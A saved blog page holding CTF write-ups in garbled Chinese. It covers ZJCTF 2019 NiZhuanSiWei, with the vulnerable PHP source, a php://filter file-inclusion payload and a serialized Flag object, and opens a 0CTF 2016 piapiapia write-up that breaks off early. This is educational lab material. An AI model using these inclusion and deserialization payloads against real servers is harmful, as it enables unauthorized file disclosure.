<!DOCTYPE html>
<html lang="en">
    <!-- title -->




<!-- keywords -->




<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
    <meta name="author" content="m0nk3y">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="m0nk3y">
    
    <meta name="keywords" content="ä¿¡æ¯å®‰å…¨,CTF,æ”»é˜²å¯¹æŠ—,ä»£ç å®¡è®¡,å®‰å…¨ç ”ç©¶,æ¸—é€æµ‹è¯•">
    
    <meta name="description" content="">
    <meta name="description" content="[ZJCTF 2019]NiZhuanSiWei12345678910111213141516171819 &lt;?php  $text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];$password &#x3D; $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file">
<meta property="og:type" content="article">
<meta property="og:title" content="å¯æƒœæ²¡å¦‚æœã€m0nk3yâ€˜s Blog">
<meta property="og:url" content="https://hack-for.fun/fb23.html">
<meta property="og:site_name" content="å¯æƒœæ²¡å¦‚æœã€m0nk3yâ€˜s Blog">
<meta property="og:description" content="[ZJCTF 2019]NiZhuanSiWei12345678910111213141516171819 &lt;?php  $text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];$password &#x3D; $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223091031.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223111717.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223114534.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223114926.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223133130.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223142822.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223152029.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223152709.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223153148.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223153711.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223160846.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223161427.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223165804.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223205845.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223205752.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223221730.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223222553.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224143000.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224172350.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224145330.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224151402.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224152714.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224161434.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200225171939.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200225164852.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200225170142.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200225234937.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228111130.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228144952.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228144912.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228151226.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228154746.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228165052.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228165125.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200301162345.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200301163043.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200301164726.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200301132734.png">
<meta property="article:published_time" content="2020-02-22T16:00:00.000Z">
<meta property="article:modified_time" content="2020-08-25T08:45:07.289Z">
<meta property="article:author" content="m0nk3y">
<meta property="article:tag" content="æ–‡ä»¶åŒ…å«">
<meta property="article:tag" content="ååºåˆ—åŒ–">
<meta property="article:tag" content="RCE">
<meta property="article:tag" content="Java">
<meta property="article:tag" content="Unicode">
<meta property="article:tag" content="tricks">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223091031.png">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    
    <title>M0nk3y&#39;s Blog</title>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
    
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href= "https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201102172212.JPG" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
    <link rel="preload" href="/scripts/main.js" as="script" />
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
    
    <!-- fancybox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
    <!-- ç™¾åº¦ç»Ÿè®¡  -->
    
    <!-- è°·æ­Œç»Ÿè®¡  -->
    
<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="å¯æƒœæ²¡å¦‚æœã€m0nk3yâ€˜s Blog" type="application/atom+xml">
</head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- posté¡µçš„toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/" >M0nk3y&#39;s Blog</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name"></a>
            </div>
    </div>
    
    <a class="home-link" href=/>M0nk3y's Blog</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style="







height:50vh;
">
    
    <!-- ä¸»é¡µ  -->
    
    
    <!-- 404é¡µ  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"></div>
    <div class="site-intro-meta">
        <!-- æ ‡é¢˜  -->
        <h1 class="intro-title">
            <!-- ä¸»é¡µ  -->
            
            [Untitled Post]
            <!-- 404 -->
            
        </h1>
        <!-- å‰¯æ ‡é¢˜ -->
        <p class="intro-subtitle">
            <!-- ä¸»é¡µå‰¯æ ‡é¢˜  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- æ–‡ç« é¡µmeta -->
        
            <div class="post-intros">
                <!-- æ–‡ç« é¡µæ ‡ç­¾  -->
                
                    <div class= post-intro-tags >
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "æ–‡ä»¶åŒ…å«">æ–‡ä»¶åŒ…å«</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "ååºåˆ—åŒ–">ååºåˆ—åŒ–</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "RCE">RCE</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "Java">Java</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "Unicode">Unicode</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "tricks">tricks</a>
    
</div>
                
                
                    <div class="post-intro-read">
                        <span>Word count: <span class="post-count word-count">13.2k</span>Reading time: <span class="post-count reading-time">55 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                    <span class="post-intro-time">2020/02/23</span>
                    
                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                        <span class="iconfont-archer">&#xe602;</span>
                        <span id="busuanzi_value_page_pv"></span>
                    </span>
                    
                    <span class="shareWrapper">
                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
                        <span class="shareText">Share</span>
                        <ul class="shareList">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>
        <script>
 
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IEå†…æ ¸
        presto: u.indexOf('Presto') > -1, //operaå†…æ ¸
        webKit: u.indexOf('AppleWebKit') > -1, //è‹¹æœã€è°·æ­Œå†…æ ¸
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //ç«ç‹å†…æ ¸
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //æ˜¯å¦ä¸ºç§»åŠ¨ç»ˆç«¯
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //iosç»ˆç«¯
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //androidç»ˆç«¯æˆ–è€…ucæµè§ˆå™¨
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //æ˜¯å¦ä¸ºiPhoneæˆ–è€…å®‰å“QQæµè§ˆå™¨
        iPad: u.indexOf('iPad') > -1, //æ˜¯å¦ä¸ºiPad
        webApp: u.indexOf('Safari') == -1, //æ˜¯å¦ä¸ºwebåº”ç”¨ç¨‹åºï¼Œæ²¡æœ‰å¤´éƒ¨ä¸åº•éƒ¨
        weixin: u.indexOf('MicroMessenger') == -1, //æ˜¯å¦ä¸ºå¾®ä¿¡æµè§ˆå™¨
        uc: u.indexOf('UCBrowser') > -1 //æ˜¯å¦ä¸ºandroidä¸‹çš„UCæµè§ˆå™¨
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in');
      }
    }
  }

  // UCä¸æ”¯æŒè·¨åŸŸï¼Œæ‰€ä»¥ç›´æ¥æ˜¾ç¤º
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //æ‰€æœ‰å­—ä½“å¼€å§‹åŠ è½½
          // console.log('loading');
        },
        active: function () {  //æ‰€æœ‰å­—ä½“å·²æ¸²æŸ“
          fontLoaded();
        },
        inactive: function () { //å­—ä½“é¢„åŠ è½½å¤±è´¥ï¼Œæ— æ•ˆå­—ä½“æˆ–æµè§ˆå™¨ä¸æ”¯æŒåŠ è½½
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <a id="more"></a>

<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªç»•è¿‡å¾ˆç®€å•: </p>
<ul>
<li>åˆ©ç”¨<code>php://input</code> å³å¯ç»•è¿‡<code>file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;</code> </li>
</ul>
<p>php://input å¯ä»¥æŠŠPOSTè¯·æ±‚è¿‡æ¥çš„æ•°æ®æµå½“åšæ–‡ä»¶è¿›è¡Œå¤„ç† ,å½“ç„¶data:// ä¹Ÿå¯.</p>
<ul>
<li>ç¬¬äºŒä¸ªif è¯­å¥ä¸­,å¦‚æœfileä¸­åŒ¹é…åˆ°äº†flag,å°±exit();é€€å‡ºè„šæœ¬,å¦‚æœæ²¡æœ‰å°±è¿›è¡Œæ–‡ä»¶åŒ…å«<code>include($file)</code> è¿™é‡Œå¹¶ä¸”æ˜¯ä»»æ„æ–‡ä»¶åŒ…å«.æ²¡æœ‰å¯¹å˜é‡fileè¿›è¡Œé™åˆ¶,è¿™é‡Œæˆ‘ç›´æ¥åŒ…å«æ²¡æœ‰å†…å®¹å›æ˜¾,ç”¨ä¼ªåè®®åŒ…å«å°±å¯ä»¥äº†</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>

<p>å¯¹å¾—åˆ°çš„å†…å®¹è¿›è¡Œ base64decode</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">// è¿™ä¸Šé¢å°±æ˜¯base64decodeçš„ç»“æœ</span></span><br><span class="line">$a = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>payload: </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223091031.png"></p>
<h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><blockquote>
<p>çŸ¥è¯†ç‚¹: <strong>ååºåˆ—åŒ–é•¿åº¦å˜åŒ–å°¾éƒ¨å­—ç¬¦ä¸²é€ƒé€¸</strong></p>
</blockquote>
<p>// ç™»å½•å¤„,å°è¯•æ³¨å…¥æ²¡æœ‰æŠ¥é”™,ä½†æ˜¯æ²¡æœ‰è¯•ç›²æ³¨,çˆ†ç ´æ˜¯ä¸å¯èƒ½çš„,äºæ˜¯æ‰«æä¸€ä¸‹ç›®å½•</p>
<p>æˆåŠŸæ‰«æåˆ°äº† <code>www.zip</code> å’Œ <code>register.php</code> </p>
<p>è®°å½•ä¸€ä¸‹åšè¿™é“é¢˜å­¦ä¹ çš„ç›¸å…³çŸ¥è¯†: è™½ç„¶æœ‰äº›ä»¥å‰çŸ¥é“</p>
<blockquote>
<p>å£°æ˜ç±»å±æ€§æˆ–æ–¹æ³•ä¸ºé™æ€ï¼Œå°±å¯ä»¥ä¸å®ä¾‹åŒ–ç±»è€Œç›´æ¥è®¿é—®ã€‚é™æ€å±æ€§ä¸èƒ½é€šè¿‡ä¸€ä¸ªç±»å·²å®ä¾‹åŒ–çš„å¯¹è±¡æ¥è®¿é—®ï¼ˆä½†é™æ€æ–¹æ³•å¯ä»¥ï¼‰ã€‚</p>
<p>ç”±äºé™æ€æ–¹æ³•ä¸éœ€è¦é€šè¿‡å¯¹è±¡å³å¯è°ƒç”¨ï¼Œæ‰€ä»¥ä¼ªå˜é‡ $this åœ¨é™æ€æ–¹æ³•ä¸­ä¸å¯ç”¨ã€‚</p>
<p>é™æ€å±æ€§ä¸å¯ä»¥ç”±å¯¹è±¡é€šè¿‡ -&gt; æ“ä½œç¬¦æ¥è®¿é—®ã€‚</p>
<p>ç±»å±æ€§å¿…é¡»å®šä¹‰ä¸ºå…¬æœ‰ï¼Œå—ä¿æŠ¤ï¼Œç§æœ‰ä¹‹ä¸€ã€‚å¦‚æœç”¨ <em>var</em> å®šä¹‰ï¼Œåˆ™è¢«è§†ä¸ºå…¬æœ‰ã€‚</p>
<p>ç±»ä¸­çš„æ–¹æ³•å¯ä»¥è¢«å®šä¹‰ä¸ºå…¬æœ‰ï¼Œç§æœ‰æˆ–å—ä¿æŠ¤ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®è¿™äº›å…³é”®å­—ï¼Œåˆ™è¯¥<strong>æ–¹æ³•é»˜è®¤ä¸ºå…¬æœ‰ã€‚</strong></p>
<p><strong>åŒä¸€ä¸ªç±»çš„å¯¹è±¡å³ä½¿ä¸æ˜¯åŒä¸€ä¸ªå®ä¾‹ä¹Ÿå¯ä»¥äº’ç›¸è®¿é—®å¯¹æ–¹çš„ç§æœ‰ä¸å—ä¿æŠ¤æˆå‘˜</strong>ã€‚è¿™æ˜¯ç”±äºåœ¨è¿™äº›å¯¹è±¡çš„å†…éƒ¨å…·ä½“å®ç°çš„ç»†èŠ‚éƒ½æ˜¯å·²çŸ¥çš„ã€‚</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223111717.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223114534.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223114926.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223133130.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223142822.png"></p>
<p><strong>å¯¹è±¡ç»§æ‰¿(extends)</strong>: </p>
<blockquote>
<p>ç»§æ‰¿å·²ä¸ºå¤§å®¶æ‰€ç†ŸçŸ¥çš„ä¸€ä¸ªç¨‹åºè®¾è®¡ç‰¹æ€§ï¼ŒPHP çš„å¯¹è±¡æ¨¡å‹ä¹Ÿä½¿ç”¨äº†ç»§æ‰¿ã€‚ç»§æ‰¿å°†ä¼šå½±å“åˆ°ç±»ä¸ç±»ï¼Œå¯¹è±¡ä¸å¯¹è±¡ä¹‹é—´çš„å…³ç³»ã€‚</p>
<p>æ¯”å¦‚ï¼Œå½“æ‰©å±•ä¸€ä¸ªç±»ï¼Œå­ç±»å°±ä¼šç»§æ‰¿çˆ¶ç±»æ‰€æœ‰å…¬æœ‰çš„å’Œå—ä¿æŠ¤çš„æ–¹æ³•ã€‚é™¤éå­ç±»è¦†ç›–äº†çˆ¶ç±»çš„æ–¹æ³•ï¼Œè¢«ç»§æ‰¿çš„æ–¹æ³•éƒ½ä¼šä¿ç•™å…¶åŸæœ‰åŠŸèƒ½ã€‚</p>
<p>ç»§æ‰¿å¯¹äºåŠŸèƒ½çš„è®¾è®¡å’ŒæŠ½è±¡æ˜¯éå¸¸æœ‰ç”¨çš„ï¼Œè€Œä¸”å¯¹äºç±»ä¼¼çš„å¯¹è±¡å¢åŠ æ–°åŠŸèƒ½å°±æ— é¡»é‡æ–°å†å†™è¿™äº›å…¬ç”¨çš„åŠŸèƒ½ã€‚</p>
</blockquote>
<p><strong>this, self, parent</strong>: </p>
<ul>
<li>thisæ˜¯æŒ‡å‘å½“å‰å¯¹è±¡çš„æŒ‡é’ˆ</li>
<li>selfæ˜¯æŒ‡å‘å½“å‰ç±»çš„æŒ‡é’ˆ,ä¸æŒ‡å‘ä»»ä½•å·²è¿‘å®ä¾‹åŒ–åçš„å¯¹è±¡,ä¸€èˆ¬ç”¨æ¥æŒ‡å‘ç±»ä¸­çš„é™æ€å˜é‡</li>
<li>parentæ˜¯æŒ‡å‘çˆ¶ç±»çš„æŒ‡é’ˆ</li>
</ul>
<p>è¯»å®Œäº†ä¸‹è½½ä¸‹æ¥çš„è¿™å‡ ä¸ªæºç å,å‘ç°æœ‰ç”¨çš„åªåœ¨ class.php å’Œ config.php(å”¯ä¸€å­˜åœ¨flagå­—æ®µçš„å†…å®¹,è¯´æ˜flagä¸€å®šæ˜¯åœ¨config.phpé‡Œé¢,é‚£ä¹ˆç°åœ¨çš„ç›®æ ‡å°±æ˜¯å»è¯»å–config.php çš„å†…å®¹)</p>
<p>åœ¨register.php ä¸­: </p>
